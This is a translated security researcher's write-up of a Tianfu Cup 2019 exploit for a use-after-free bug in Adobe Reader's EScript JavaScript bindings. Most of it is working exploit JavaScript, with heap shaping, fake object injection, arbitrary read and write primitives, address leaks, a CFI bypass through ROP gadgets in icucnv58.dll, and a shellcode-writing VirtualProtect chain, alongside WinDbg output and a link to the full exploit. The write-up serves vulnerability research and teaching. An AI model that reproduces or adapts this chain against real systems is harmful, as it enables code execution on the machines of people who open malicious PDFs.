
# 天府杯2019：Adobe Reader漏洞利用


                                阅读量   
                                **465004**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](./img/202990/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Phan Thanh Duy，文章来源：starlabs.sg
                                <br>原文地址：[https://starlabs.sg/blog/2020/04/tianfu-cup-2019-adobe-reader-exploitation/](https://starlabs.sg/blog/2020/04/tianfu-cup-2019-adobe-reader-exploitation/)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/202990/t01f88b961947d3ace2.png)](./img/202990/t01f88b961947d3ace2.png)



## 前言

2019年，我参加了在中国成都举办的[天府杯](http://www.tianfucup.com/)比赛，选择的破解目标是Adobe Reader。这篇文章将详细介绍JSObject的UAF漏洞。我的漏洞利用并不是最佳解决方案，我是通过大量的尝试和错误完成了此漏洞利用。它包含了很多堆塑造（heap shaping）代码，我已经记不清为什么这样写了。我强烈建议你阅读完整的利用代码，并在必要时自行进行调试。这篇博客文章是基于安装Adobe Reader的Windows 10主机编写的。



## 漏洞

该漏洞位于EScript.api组件中，该组件是各种JS API调用的绑定层。<br>
首先，我创建一个Sound 对象数组。

```
SOUND_SZ     = 512
SOUNDS         = Array(SOUND_SZ)
for(var i=0; i&lt;512; i++) {
    SOUNDS[i] = this.getSound(i)
    SOUNDS[i].toString()
}
```

Sound对象在内存中看起来是这样的。第2个dword是一个指向JSObject的指针，JSObject有elements、slots、shape等字段，第4个dword是表示对象类型的字符串。我不确定Adobe Reader使用的是哪个版本的Spidermonkey，起初我以为这是NativeObject，但是它的字段似乎与Spidermonkey的源代码不匹配。如果你知道这种结构是什么或有疑问，请通过[Twitter](https://twitter.com/PTDuy)与我联系。

```
0:000&gt; dd @eax
088445d8  08479bb0 0c8299e8 00000000 085d41f0
088445e8  0e262b80 0e262f38 00000000 00000000
088445f8  0e2630d0 00000000 00000000 00000000
08844608  00000000 5b8c4400 6d6f4400 00000000
08844618  00000000 00000000

0:000&gt; !heap -p -a @eax
    address 088445d8 found in
    _HEAP @ 4f60000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        088445d0 000a 0000  [00]   088445d8    00048 - (busy)

0:000&gt; da 085d41f0
085d41f0  "Sound"
```

该0x48内存区域及其字段将被释放并重用。由于AdobeReader.exe是32位二进制文件，因此我可以堆喷射并确切知道受控制的数据在内存中的位置，然后可以用受控制的数据覆盖整个内存区域，并尝试找到一种控制PC的方法。但是我失败了，因为<br>
1.我真的不知道所有的这些字段都是什么；<br>
2.我没有内存泄漏；<br>
3.Adobe具有CFI。<br>
因此，我将注意力转向了JSObject（第2个dword），能够伪造JSObject是一个非常强大的原语。不幸的是第2个dword不在堆中，而是位于Adobe Reader启动时由VirtualAlloc分配的内存区域中。需要注意的重要一点是，这块内存内容在释放后没有清除。

```
0:000&gt; !address 0c8299e8

Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  &lt;unknown&gt;
Base Address:           0c800000
End Address:            0c900000
Region Size:            00100000 (   1.000 MB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        0c800000
Allocation Protect:     00000004          PAGE_READWRITE

Content source: 1 (target), length: d6618
```

我意识到ESObjectCreateArrayFromESVals和ESObjectCreate也分配到这个区域。我使用currentValueIndices函数来调用ESObjectCreateArrayFromESVals：

```
/* prepare array elements buffer */
f = this.addField("f" , "listbox", 0, [0,0,0,0]);
t = Array(32)
for(var i=0; i&lt;32; i++) t[i] = i
f.multipleSelection = 1
f.setItems(t)
f.currentValueIndices = t
// every time currentValueIndices is accessed `ESObjectCreateArrayFromESVals` is called to create a new array.
for(var j=0; j&lt;THRESHOLD_SZ; j++) f.currentValueIndices
```

查看ESObjectCreateArrayFromESVals返回值，可以看到JSObject 0d2ad1f0不在堆上，但是它的elements缓冲区却在08c621e8上。ffffff81是表示数字的标签，就像ffffff85表示字符串，ffffff87表示对象一样。

```
0:000&gt; dd @eax
0da91b00  088dfd50 0d2ad1f0 00000001 00000000
0da91b10  00000000 00000000 00000000 00000000
0da91b20  00000000 00000000 00000000 00000000
0da91b30  00000000 00000000 00000000 00000000
0da91b40  00000000 00000000 5b9868c6 88018800
0da91b50  0dbd61d8 537d56f8 00000014 0dbeb41c
0da91b60  0dbd61d8 00000030 089dfbdc 00000001
0da91b70  00000000 00000003 00000000 00000003
0:000&gt; !heap -p -a 0da91b00
    address 0da91b00 found in
    _HEAP @ 5570000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        0da91af8 000a 0000  [00]   0da91b00    00048 - (busy)

0:000&gt; dd 0d2ad1f0
0d2ad1f0  0d2883e8 0d225ac0 00000000 08c621e8
0d2ad200  0da91b00 00000000 00000000 00000000
0d2ad210  00000000 00000020 0d227130 0d2250c0
0d2ad220  00000000 553124f8 0da8dfa0 00000000
0d2ad230  00c10003 0d27d180 0d237258 00000000
0d2ad240  0d227130 0d2250c0 00000000 553124f8
0d2ad250  0da8dcd0 00000000 00c10001 0d27d200
0d2ad260  0d237258 00000000 0d227130 0d2250c0
0:000&gt; dd 08c621e8
08c621e8  00000000 ffffff81 00000001 ffffff81
08c621f8  00000002 ffffff81 00000003 ffffff81
08c62208  00000004 ffffff81 00000005 ffffff81
08c62218  00000006 ffffff81 00000007 ffffff81
08c62228  00000008 ffffff81 00000009 ffffff81
08c62238  0000000a ffffff81 0000000b ffffff81
08c62248  0000000c ffffff81 0000000d ffffff81
08c62258  0000000e ffffff81 0000000f ffffff81

0:000&gt; dd 08c621e8
08c621e8  00000000 ffffff81 00000001 ffffff81
08c621f8  00000002 ffffff81 00000003 ffffff81
08c62208  00000004 ffffff81 00000005 ffffff81
08c62218  00000006 ffffff81 00000007 ffffff81
08c62228  00000008 ffffff81 00000009 ffffff81
08c62238  0000000a ffffff81 0000000b ffffff81
08c62248  0000000c ffffff81 0000000d ffffff81
08c62258  0000000e ffffff81 0000000f ffffff81
0:000&gt; !heap -p -a 08c621e8
    address 08c621e8 found in
    _HEAP @ 5570000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        08c621d0 0023 0000  [00]   08c621d8    00110 - (busy)
```

因此，我们现在的目标是覆盖这个elements缓冲区以注入伪造的Javascript对象。这是我目前的计划：<br>
1.释放Sound对象；<br>
2.尝试使用currentValueIndices分配密集数组到释放的Sound对象位置；<br>
3.释放密集数组；<br>
4.尝试分配到释放的elements缓冲区中；<br>
5.注入伪造的Javascript对象。<br>
下面的代码遍历SOUNDS数组以释放其元素并使用currentValueIndices回收它们：

```
/* free and reclaim sound object */
RECLAIM_SZ         = 512
RECLAIMS         = Array(RECLAIM_SZ)
THRESHOLD_SZ     = 1024*6
NTRY             = 3
NOBJ             = 8 //18
for(var i=0; i&lt;NOBJ; i++) {
    SOUNDS[i] = null //free one sound object
    gc()

    for(var j=0; j&lt;THRESHOLD_SZ; j++) f.currentValueIndices
    try {
    //if the reclaim succeed `this.getSound` return an array instead and its first element should be 0
         if (this.getSound(i)[0] == 0) {
             RECLAIMS[i] = this.getSound(i)
        } else {
            console.println('RECLAIM SOUND OBJECT FAILED: '+i)
            throw ''
        }
    }
    catch (err) {
        console.println('RECLAIM SOUND OBJECT FAILED: '+i)
        throw ''
    }
    gc()
}
console.println('RECLAIM SOUND OBJECT SUCCEED')
```

接下来，我们将释放所有密集数组，并尝试使用TypedArray将其分配回elements缓冲区。我在数组的开头放置了伪造的整数0x33441122，以检查是否回收成功。然后将带有可控elements缓冲区的损坏数组放入变量T：

```
/* free all allocated array objects */
this.removeField("f")
RECLAIMS     = null
f             = null
FENCES         = null //free fence
gc()

for (var j=0; j&lt;8; j++) SOUNDS[j] = this.getSound(j)
/* reclaim freed element buffer */
for(var i=0; i&lt;FREE_110_SZ; i++) {
    FREES_110[i] = new Uint32Array(64)
    FREES_110[i][0] = 0x33441122
    FREES_110[i][1] = 0xffffff81
}
T = null
for(var j=0; j&lt;8; j++) {
    try {
    // if the reclaim succeed the first element would be our injected number
        if (SOUNDS[j][0] == 0x33441122) {
            T = SOUNDS[j]
            break
        }
    } catch (err) {}
}
if (T==null) {
    console.println('RECLAIM element buffer FAILED')
    throw ''
} else console.println('RECLAIM element buffer SUCCEED')
```

从这一点出发，我们可以将伪造的Javascript对象放入elements缓冲区并泄漏分配给它的对象地址。以下代码用于找出哪个TypedArray是我们伪造的elements缓冲区并泄漏其地址。

```
/* create and leak the address of an array buffer */
WRITE_ARRAY = new Uint32Array(8)
T[0] = WRITE_ARRAY
T[1] = 0x11556611
for(var i=0; i&lt;FREE_110_SZ; i++) {
    if (FREES_110[i][0] != 0x33441122) {
        FAKE_ELES = FREES_110[i]
        WRITE_ARRAY_ADDR = FREES_110[i][0]
        console.println('WRITE_ARRAY_ADDR: ' + WRITE_ARRAY_ADDR.toString(16))
        assert(WRITE_ARRAY_ADDR&gt;0)
        break
    } else {
        FREES_110[i] = null
    }
}
```



## 任意读/写原语

为了获得任意读取原语，我将一串伪造的字符串对象喷射入堆中，然后将其分配到我们的elements缓冲区中。

```
GUESS = 0x20000058 //0x20d00058 
/* spray fake strings */
for(var i=0x1100; i&lt;0x1400; i++) {
    var dv = new DataView(SPRAY[i])
    dv.setUint32(0, 0x102,         true) //string header
    dv.setUint32(4, GUESS+12,     true) //string buffer, point here to leak back idx 0x20000064
    dv.setUint32(8, 0x1f,         true) //string length
    dv.setUint32(12, i,            true) //index into SPRAY that is at 0x20000058
    delete dv
}
gc()

//app.alert("Create fake string done")
/* point one of our element to fake string */
FAKE_ELES[4] = GUESS
FAKE_ELES[5] = 0xffffff85

/* create aar primitive */
SPRAY_IDX = s2h(T[2])
console.println('SPRAY_IDX: ' + SPRAY_IDX.toString(16))
assert(SPRAY_IDX&gt;=0)
DV = DataView(SPRAY[SPRAY_IDX])
function myread(addr) {
    //change fake string object's buffer to the address we want to read.
    DV.setUint32(4, addr, true)
    return s2h(T[2])
}
```

同样，为了实现任意写入，我创建了一个伪造的TypedArray。我只是复制WRITE_ARRAY内容并更改其SharedArrayRawBuffer指针。

```
/* create aaw primitive */
for(var i=0; i&lt;32; i++) {DV.setUint32(i*4+16, myread(WRITE_ARRAY_ADDR+i*4), true)} //copy WRITE_ARRAY
FAKE_ELES[6] = GUESS+0x10
FAKE_ELES[7] = 0xffffff87
function mywrite(addr, val) {
    DV.setUint32(96, addr, true)
    T[3][0] = val
}
//mywrite(0x200000C8, 0x1337)
```



## 获得代码执行

使用任意的读/写原语，我能够泄漏EScript.API的基址在TypedArray对象的头部。在EScript.API内部有一个非常方便的gadget 可以调用VirtualAlloc。

```
//d8c5e69b5ff1cea53d5df4de62588065 - md5sun of EScript.API
ESCRIPT_BASE = myread(WRITE_ARRAY_ADDR+12) - 0x02784D0 //data:002784D0 qword_2784D0    dq ? 
console.println('ESCRIPT_BASE: '+ ESCRIPT_BASE.toString(16))
assert(ESCRIPT_BASE&gt;0)
```

接下来，我泄漏了AcroForm.API的地址基址和CTextField（0x60大小）对象的地址。首先使用addField分配一批CTextField对象，然后创建一个也具有0x60大小的字符串对象，泄漏此字符串（MARK_ADDR）的地址。我们可以放心地假设这些CTextField对象将位于MARK_ADDR后面。最后我遍历堆以查找CTextField::vftable。

```
/* leak .rdata:007A55BC ; const CTextField::`vftable' */
//f9c59c6cf718d1458b4af7bbada75243
for(var i=0; i&lt;32; i++) this.addField(i, "text", 0, [0,0,0,0]);
T[4] = STR_60.toLowerCase()
for(var i=32; i&lt;64; i++) this.addField(i, "text", 0, [0,0,0,0]);
MARK_ADDR = myread(FAKE_ELES[8]+4)
console.println('MARK_ADDR: '+ MARK_ADDR.toString(16))
assert(MARK_ADDR&gt;0)
vftable = 0
while (1) {
    MARK_ADDR += 4
    vftable = myread(MARK_ADDR)
    if ( ((vftable&amp;0xFFFF)==0x55BC) &amp;&amp; (((myread(MARK_ADDR+8)&amp;0xff00ffff)&gt;&gt;&gt;0)==0xc0000000)) break
}
console.println('MARK_ADDR: '+ MARK_ADDR.toString(16))
assert(MARK_ADDR&gt;0)

/* leak acroform, icucnv58 base address */
ACROFORM_BASE = vftable-0x07A55BC
console.println('ACROFORM_BASE: ' + ACROFORM_BASE.toString(16))
assert(ACROFORM_BASE&gt;0)
```

然后，我们可以覆盖CTextField对象的vftable虚表来控制PC。



## 绕过CFI

启用CFI后，我们无法使用ROP。我编写了一个小脚本来查找任何未启用CFI的模块，它会在我的漏洞利用程序运行时被加载。我找到了icucnv58.dll。

```
import pefile
import os

for root, subdirs, files in os.walk(r'C:Program Files (x86)AdobeAcrobat Reader DCReader'):
    for file in files:
        if file.endswith('.dll') or file.endswith('.exe') or file.endswith('.api'):
            fpath = os.path.join(root, file)
            try:
                pe = pefile.PE(fpath, fast_load=1)
            except Exception as e:
                print (e)
                print ('error', file)
            if (pe.OPTIONAL_HEADER.DllCharacteristics &amp; 0x4000) == 0:
                print (file)
```

该icucnv58.dll基址可以通过Acroform.API被泄露出来，在icucnv58.dll内部有足够的gadgets来执行stack pivot和ROP。

```
//a86f5089230164fb6359374e70fe1739 - md5sum of `icucnv58.dll`
r = myread(ACROFORM_BASE+0xBF2E2C)
ICU_BASE = myread(r+16)
console.println('ICU_BASE: ' + ICU_BASE.toString(16))
assert(ICU_BASE&gt;0)

g1 = ICU_BASE + 0x919d4 + 0x1000//mov esp, ebx ; pop ebx ; ret
g2 = ICU_BASE + 0x73e44 + 0x1000//in al, 0 ; add byte ptr [eax], al ; add esp, 0x10 ; ret
g3 = ICU_BASE + 0x37e50 + 0x1000//pop esp;ret
```



## 最后一步

最后，我们拥有实现完整代码执行所需的一切。使用任意写入原语将shellcode写入内存，然后调用VirtualProtect以启用执行权限。如果你有兴趣，可以在[这里](https://github.com/star-sg/CVE/tree/master/CVE-2019-16452)找到完整的利用代码。结果，我的UAF漏洞利用程序的可靠性可以达到约80％的成功率。这个漏洞利用平均需要3-5秒，如果需要多次重试，则利用可能需要更多时间。

```
/* copy CTextField vftable */
for(var i=0; i&lt;32; i++) mywrite(GUESS+64+i*4, myread(vftable+i*4))
mywrite(GUESS+64+5*4, g1)  //edit one pointer in vftable

// // /* 1st rop chain */
mywrite(MARK_ADDR+4, g3)
mywrite(MARK_ADDR+8, GUESS+0xbc)

// // /* 2nd rop chain */
rop = [
myread(ESCRIPT_BASE + 0x01B0058), //VirtualProtect
GUESS+0x120, //return address
GUESS+0x120, //buffer
0x1000, //sz
0x40, //new protect
GUESS-0x20//old protect
]
for(var i=0; i&lt;rop.length;i++) mywrite(GUESS+0xbc+4*i, rop[i])

//shellcode
shellcode = [835867240, 1667329123, 1415139921, 1686860336, 2339769483,
            1980542347, 814448152, 2338274443, 1545566347, 1948196865, 4270543903,
            605009708, 390218413, 2168194903, 1768834421, 4035671071, 469892611,
            1018101719, 2425393296]
for(var i=0; i&lt;shellcode.length; i++) mywrite(GUESS+0x120+i*4, re(shellcode[i]))

/* overwrite real vftable */
mywrite(MARK_ADDR, GUESS+64)
```

最后，利用该漏洞，我们可以弹出计算器。
